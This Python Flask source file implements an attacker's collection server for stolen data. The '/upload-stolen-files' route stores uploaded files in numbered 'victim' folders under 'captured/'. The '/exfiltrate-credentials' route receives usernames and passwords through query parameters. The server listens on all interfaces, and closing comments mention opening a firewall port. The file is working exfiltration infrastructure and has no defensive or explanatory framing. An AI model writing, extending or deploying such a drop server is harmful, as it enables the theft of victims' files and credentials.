from flask import Flask, request, redirect, url_for, jsonify, render_template, flash
from flask_session import Session
from werkzeug.utils import secure_filename
import os

# Initialise Flask app
app = Flask(__name__)
app.secret_key = 'cure51'  # Replace with a secure secret key

# Initialize the session
Session(app)

# Folder to upload in windows
UPLOAD_FOLDER = 'captured/'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/upload-stolen-files', methods=['GET','POST'])
def upload_stolen_file():
    def upload_1_file(file):
        print("File upload method: Single")
        filename = secure_filename(file.filename)
        file.save(os.path.join(victim_dir, filename))
        return filename

    def upload_multi_file(files):
        print("File upload method: Multi")
        for file in files:
            if file.filename == '':
                response = {
                    'status': 'success',
                    'message': 'No more files uploaded.'
                }
                return jsonify(response), 200
            elif file:
                filename = secure_filename(file.filename)
                file.save(os.path.join(victim_dir, filename))
        return filename

    victim_index = 1
    if request.method == 'POST':
        print("Headers:", request.headers)
        print("Form data:", request.form, "\n")
        # Check if POST request has the file part
        if 'stolen-files[]' not in request.files:
            print("request.files keys:", request.files.keys())
            response = {
                'status': 'error',
                'message': 'Incorrect file key.',
                'key': f'{request.files.keys()}',
                'request': f'{request}',
                'request.files': f'{request.files}',
                'request.1': f'{request.dict_storage_class}'
            }
            return jsonify(response), 400
        print("request.files keys:", request.files.keys())
        print("request.files values:", request.files.values())

        files = request.files.getlist('stolen-files[]')
        if files[0].filename == '':
            response = {
                'status': 'error',
                'message': 'No file uploaded.'
            }
            return jsonify(response), 400

        while True:
            victim_dir = os.path.join(UPLOAD_FOLDER, f"victim-{victim_index}/")
            if not os.path.exists(victim_dir):
                os.makedirs(victim_dir)
                break
            else:
                victim_index += 1
        
        if files:
            filename = upload_multi_file(files)
        else:
            onefile = request.files.get('stolen-files[]')
            if onefile:
                filename = upload_1_file(onefile)
            else:
                response = {
                    'status': 'error',
                    'message': 'No file uploaded.'
                }
                return jsonify(response), 400
        
        return redirect(url_for('check_captured', filename=filename, victim=f"victim-{victim_index}"))
    return render_template('uploads.html')

@app.route('/check-captured/<victim>/<filename>')
def check_captured(filename, victim):
    response = {
        'status': 'success',
        'message': f'{filename} successfully uploaded to {victim}.',
        'filename': filename,
        'victim': victim
    }
    return jsonify(response), 200

@app.route('/check-availability', methods=['GET', 'HEAD'])
def check_availability():
    if request.method == 'GET':
        return render_template('check-availability.html')
    return

@app.route('/exfiltrate-credentials', methods=['GET'])
def exfiltrate_credentials():
    username = request.args.get('username')
    password = request.args.get('password')
    if username and password:
        flash(f"Username: {username}, Password: {password}", category="success")
        return '', 200
    else:
        return '', 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

#Specify port
#Allow port through firewall